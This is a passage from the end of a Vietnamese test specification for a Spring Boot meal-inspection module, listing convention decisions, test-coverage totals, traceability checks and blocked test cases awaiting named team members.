| **D3** | `baseURL = /api/v1` | `TC-E2E-003` | — (TDS đã dùng `/api/v1`) |
| **D4** | JSON ngày **ISO-8601**; bỏ `@JsonFormat` | `TC-024`, `TC-E2E-003` | §17.1 **C12** + CF-22 (`dd/MM/yyyy`) → **L3** |
| **D5** | Nhận `id` client → trùng 409; vắng thì server sinh; luôn trả `id` | `TC-026` | — (TDS chưa nêu; D5 lấy chuẩn từ MF05 CF-11) |
| **D6** | `MealType` = `BREAKFAST\|LUNCH\|SNACK` SCREAMING_SNAKE; nhãn `SNACK` = **"Bữa phụ"** | `TC-025` | §17.1 **C12** + CF-8 (`meal` tiếng Việt, `"Bữa chiều"`) → **L4** |
| **D7** | `message` **tiếng Anh** nguyên văn `error_message.md` | `TC-003`, `TC-SEC-001` | — (TDS §10 đã giữ tiếng Anh) |

### 9.7. Tổng kết coverage

| Nhóm | Số TC | Trạng thái ban đầu |
|---|---|---|
| Unit (service layer) | **28** | 🔴 27 · ⚠️ 1 `@Disabled` (TC-005, CF-24/L19) |
| Security (RBAC / OWASP / PDPD / pháp lý) | **16** | 🔴 16 |
| Integration (API → DB, Testcontainers) | **20** | 🔴 20 |
| E2E | **3** | 🔴 3 |
| **Tổng** | **67** | 🔴 66 · ⚠️ 1 `@Disabled` |

| Đối chiếu | Kết quả |
|---|---|
| Condition §3 TDS-03 có TC | **42/42** |
| Constraint C1–C14 (§17.1 TDS) có TC | **14/14** |
| Quyết định D1–D7 có TC | **7/7** |
| Hàng §13 TDS (`UT`/`IT`/`SEC`/`E2E`) có TC | **43/43** |
| UC §1.7 có TC | **11/11** |
| Luật `semantic-audit.ts` §7 có TC | **1/1** |
| Logic Issue L1–L22 được xử lý rõ | **22/22** |
| BR trong §1.7 có TC | **21/21** |
| MSG trong §1.7 + §10 có TC | **15/15** |

**Blocked / chờ người khác (theo dõi ở §6 Suspension Criteria):**

| TC | Chờ ai | Việc gì |
|---|---|---|
| `TC-005` `@Disabled` · `TC-INT-013` guard | **Minh** | Bổ sung ô nhập `holdingTemp` ở Bước 3 (L19/CF-24) |
| `TC-SEC-015` · nhánh âm `TC-E2E-001` | **Minh** | Gỡ lọc client-side màn phát suất, gọi `serving-gate` (L17/CF-20) |
| `TC-008` · `TC-INT-008` (phần trùng lặp) | **Minh** | Gỡ lệnh gọi CAPA ở client (L12/CF-14) |
| `TC-006` ranh giới HSD "đúng ngày" | **Huy** | Xác nhận `expiryDate == session.date` là còn hạn hay hết hạn |
| `TC-007` phần 4 cột `fail_*` | **Huy** | Xác nhận `fail_severity`/`fail_witness` là field chính thức (L20/CF-25) |
| `TC-018` assert chuỗi MSG | **Huy** | Cập nhật nội dung MSG-088 theo BR-187 bản 26/07 |
| `TC-012` traceability MSG-093 | **Huy** | Bổ sung MSG-093 vào §1.7 cho UC-014 (L6/CF-2) |
| `TC-022` · `TC-023` | **Huy** | Quyết định 6 field CF-10: chính thức hoá hay descope |
| `TC-SEC-009` phạm vi | **Nam** | Chốt ranh giới MF07↔MF11 cho `ViolationRecord` (L10/CF-6) |
| `TC-016` · `TC-INT-010` | **Nam** | Chốt chủ sở hữu API checklist (MF07 đọc vs MF12 CRUD — CF-9) |
| `TC-SEC-013` | **Nam** | Chốt 405 vs 403 cho `DELETE /inspections` |
| `TC-INT-016` | **Mạnh** | Cập nhật §5.2 theo D1 (PK UUID + cột `code`) — L1 |

---

*TestSpec MF07 v1.0 — theo `06_Document/Templates/PHASE-4_Test-Spec.md` (ISO/IEC/IEEE 29119-3:2021), tích hợp CASE 2.0 Red Gate + Anti-Pattern Detection.*
*Áp dụng `07_implement/00_Common_Conventions.md` **D1–D7** (Approved 2026-07-30) — ưu tiên cao hơn ADR module; 4 điểm ghi đè ghi ở §2 L1–L4.*
*Cú pháp đã dịch sang stack thật: **Java 25 / Spring Boot 4.1.x / JUnit 5 / Testcontainers / Flyway / PDFBox** — không dùng TypeScript/Jest/Prisma của template minh hoạ.*
